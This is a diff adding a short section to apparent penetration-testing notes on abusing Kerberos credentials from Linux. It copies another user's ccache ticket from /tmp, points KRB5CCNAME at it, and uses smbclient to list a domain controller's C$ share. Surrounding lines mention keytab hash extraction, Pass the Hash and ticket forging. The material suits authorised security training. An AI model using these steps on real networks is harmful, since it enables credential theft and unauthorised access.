@@ -157,3 +157,15 @@ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
 - With the NTLM hash, we can perform a Pass the Hash attack. 
 - With the AES256 or AES128 hash, we can forge our tickets using Rubeus PtT.
 - or attempt to crack the hashes to obtain the plaintext password.
+
+
+## Abusing Keytab ccache
+- klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work.
+- ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
+```powershell
+ls -la /tmp
+cp /tmp/krb5cc_647401106_I8I133 .
+export KRB5CCNAME=/root/krb5cc_647401106_I8I133
+klist
+smbclient //dc01/C$ -k -c ls -no-pass
+```
